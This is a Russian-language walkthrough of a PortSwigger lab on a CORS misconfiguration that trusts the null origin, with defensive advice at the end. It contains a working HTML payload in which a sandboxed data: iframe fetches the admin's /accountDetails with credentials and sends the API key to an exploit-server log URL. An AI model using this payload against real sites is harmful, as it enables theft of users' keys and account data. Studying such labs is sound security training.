# CORS PORTSWIGGER — Trusted Null Origin

> **Категория:** Web
> **Сложность:** Easy
> **Уязвимость:** CORS Misconfiguration (Trusted Null Origin)
> **Источник:** [portswigger.net/web-security/cors/lab-null-origin-whitelisted](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted)

---

## Входные данные

Дана CORS-уязвимость. Задача — с помощью JS-кода вытащить API-ключ администратора.

---

## Суть уязвимости

Сервер настроен доверять запросам с `Origin: null` — отвечает `Access-Control-Allow-Origin: null` вместе с `Access-Control-Allow-Credentials: true`. Разработчик, видимо, считал, что null origin встречается только в безобидных служебных случаях, но его легко получить специально через iframe с `sandbox` и `data:` URL — у такой страницы всегда origin = `null`, независимо от остального.

API-ключ отдаётся эндпоинтом `/accountDetails` (найден через DevTools → Network).

Проверка через Burp Repeater: подставили `Origin: https://example.com` → ACAO не вернулся (не доверяет). Подставили `Origin: null` → сервер ответил `Access-Control-Allow-Origin: null` + `Access-Control-Allow-Credentials: true` → подтверждено.

---

## Эксплуатация

**1.** Пишем эксплойт — вкладываем ворующий скрипт в `data:` iframe с `sandbox`, без `allow-same-origin`, чтобы origin точно остался `null`:

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location = 'https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key=' + this.responseText;
    };
</script>"></iframe>
```

**2.** Вставляем в Body на exploit-сервере → **Store**

**3.** **Deliver exploit to victim**

**4.** Смотрим **Access log** — там API-ключ администратора

---

## Способы защиты

Не доверять `Origin: null` как доверенному значению; настраивать ACAO строго по белому списку конкретных доменов; не сочетать разрешение `null`/wildcard/reflection с `Allow-Credentials: true`.
